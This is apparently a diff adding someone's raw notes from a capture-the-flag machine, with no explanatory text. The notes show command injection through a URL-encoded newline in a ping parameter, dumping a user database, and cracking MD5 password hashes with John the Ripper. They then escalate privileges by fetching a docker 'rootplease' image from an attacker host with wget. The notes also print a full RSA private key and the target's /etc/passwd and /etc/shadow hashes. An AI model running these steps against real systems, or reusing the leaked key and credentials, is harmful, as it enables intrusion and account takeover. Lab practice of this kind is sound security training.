@@ -1,0 +1,170 @@
+
+
+* found out about a command injection
+
+http://10.10.114.162:8081/ping?ip=10.10.114.162%0Als
+
+index.js 
+node_modules 
+package.json 
+package-lock.json 
+start.sh
+utech.db.sqlite 
+
+
+
+* remeber to url encode commands
+
+http://10.10.114.162:8081/ping?ip=10.10.114.162%0Acat%20utech.db.sqlite
+
+tableusersusersCREATE TABLE users ( login Varchar, password Varchar, type Int ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84
+
+REATE TABLE users ( login Varchar, password Varchar, type Int )
+
+r00t:f357a0c52799563c7c7b76c1e7543a32
+
+admin:0d0ea5111e3c1def594c1684e3b9be84
+
+
+
+
+$ john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
+
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+n100906          (r00t)
+mrsheafy         (admin)
+2g 0:00:00:00 DONE (2021-06-18 01:46) 6.250g/s 16701Kp/s 16701Kc/s 33090KC/s mrshollins..mrsfadhly11
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+
+r00t:n100906
+admin:mrsheafy
+
+
+
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+
+
+on attacker:
+
+sudo docker pull chrisfosterelli/rootplease
+sudo docker save --output rootplease.tar chrisfosterelli/rootplease
+sudo chmod 755 rootplease.tar
+python3 -m http.server
+
+on target:
+	
+wget http://attackerip:8000/rootplease.tar
+docker load --input rootplease.tar
+docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
+
+
+
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
+sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
+jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
+NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
+hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
+jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
+tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
+YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
+wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
+BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
+5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
+o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
+tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
+eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
+/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
+t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
+lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
+4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
+96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
+kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
+v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
+6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
+gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
+MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
+bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
+-----END RSA PRIVATE KEY-----
+
+
+
+
+# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+r00t:x:1001:1001::/home/r00t:/bin/bash
+www:x:1002:1002::/home/www:/bin/
+
+
+
+# cat /etc/shadow 
+root:$6$uFS2vTS7$Gm8ocIQf/76E4.NJN0nP2EaJ3dpPMHGQgpO5A8eDyb27xLZK6Z6UcvOHPcjB7qBOEMXmWEpPZjgsJllgKxjp30:17977:0:99999:7:::
+daemon:*:17941:0:99999:7:::
+bin:*:17941:0:99999:7:::
+sys:*:17941:0:99999:7:::
+sync:*:17941:0:99999:7:::
+games:*:17941:0:99999:7:::
+man:*:17941:0:99999:7:::
+lp:*:17941:0:99999:7:::
+mail:*:17941:0:99999:7:::
+news:*:17941:0:99999:7:::
+uucp:*:17941:0:99999:7:::
+proxy:*:17941:0:99999:7:::
+www-data:*:17941:0:99999:7:::
+backup:*:17941:0:99999:7:::
+list:*:17941:0:99999:7:::
+irc:*:17941:0:99999:7:::
+gnats:*:17941:0:99999:7:::
+nobody:*:17941:0:99999:7:::
+systemd-network:*:17941:0:99999:7:::
+systemd-resolve:*:17941:0:99999:7:::
+syslog:*:17941:0:99999:7:::
+messagebus:*:17941:0:99999:7:::
+_apt:*:17941:0:99999:7:::
+lxd:*:17941:0:99999:7:::
+uuidd:*:17941:0:99999:7:::
+dnsmasq:*:17941:0:99999:7:::
+landscape:*:17941:0:99999:7:::
+pollinate:*:17941:0:99999:7:::
+sshd:*:17974:0:99999:7:::
+lp1:$6$1d49ptFH$YQbzPQZk.2bO3hOo3ZNbKMx9MC0if5uGzPVTmYAcyTWJpTp1Ovx7AJjygfRxfeDhGXYgyBjcX8v/SKl4ZupUW0:17977:0:99999:7:::
+mysql:!:17974:0:99999:7:::
+ftp:*:17977:0:99999:7:::
+r00t:$6$ARas3UsF$W9DwGJjHvxYnEOilV/pxve76sToX73XM2VKEnw46/dPxCVrvvs2dYcZHXy9bc84q7vTP8gb5TbGrQyiihsRpN1:17977:0:99999:7:::
+www:!:17977:0:99999:7:::
